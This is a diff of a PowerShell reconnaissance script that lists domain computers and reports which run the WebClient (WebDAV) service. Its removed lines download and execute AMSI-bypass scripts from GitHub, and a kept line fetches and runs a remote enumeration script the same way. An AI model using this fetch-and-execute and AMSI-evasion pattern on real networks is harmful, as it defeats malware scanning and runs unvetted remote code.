@@ -23,8 +23,6 @@ $Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
 $Computers = $Computers | Where-Object {$_ -ne "$env:computername.$jcurrentdomain"}
 $Computers = $Computers | ForEach-Object { $_.Replace(".$($jcurrentdomain)", "") }
 
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-GetWebDAVStatus.ps1')
 
 if($Computers.Count -eq 1) {
@@ -34,7 +32,7 @@ if($Computers.Count -eq 1) {
 	$WebDAVStatusEnabled = ($WebDAVStatusEnabled | Out-String) -split "`n"
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled.Trim()
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled | Where-Object { $_ -ne "" }
-	$WebDAVStatusEnabled = $WebDAVStatusEnabled | ForEach-Object { $_.ToString().Replace("[+] WebClient service is active on ", "") }
+	$WebDAVStatusEnabled = $WebDAVStatusEnabled | ForEach-Object { $_.ToString().Replace("[+] WebClient Service is active on ", "") }
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled | Sort-Object -Unique
 }
 
@@ -46,16 +44,24 @@ else{
 	$WebDAVStatusEnabled = ($WebDAVStatusEnabled | Out-String) -split "`n"
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled.Trim()
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled | Where-Object { $_ -ne "" }
-	$WebDAVStatusEnabled = $WebDAVStatusEnabled | ForEach-Object { $_.ToString().Replace("[+] WebClient service is active on ", "") }
+	$WebDAVStatusEnabled = $WebDAVStatusEnabled | ForEach-Object { $_.ToString().Replace("[+] WebClient Service is active on ", "") }
 	$WebDAVStatusEnabled = $WebDAVStatusEnabled | Sort-Object -Unique
 }
 
-$WebDAVStatusEnabled | Out-File $pwd\WebDAVStatusEnabled.txt
+if($WebDAVStatusEnabled){
 
-Write-Host ""
-Write-Host " WebClient Service is active on:" -ForegroundColor Yellow
-Write-Host ""
-$WebDAVStatusEnabled
-Write-Host ""
-Write-Host " Output saved to: $pwd\WebDAVStatusEnabled.txt"
-Write-Host ""
+	$WebDAVStatusEnabled | Out-File $pwd\WebDAVStatusEnabled.txt
+	
+	Write-Host ""
+	Write-Host " WebClient Service is active on:" -ForegroundColor Yellow
+	Write-Host ""
+	$WebDAVStatusEnabled
+	Write-Host ""
+	Write-Host " Output saved to: $pwd\WebDAVStatusEnabled.txt"
+	Write-Host ""
+ }
+
+ else{
+ 	Write-Host " No hosts found where the WebClient Service is active."
+  	Write-Host ""
+  }
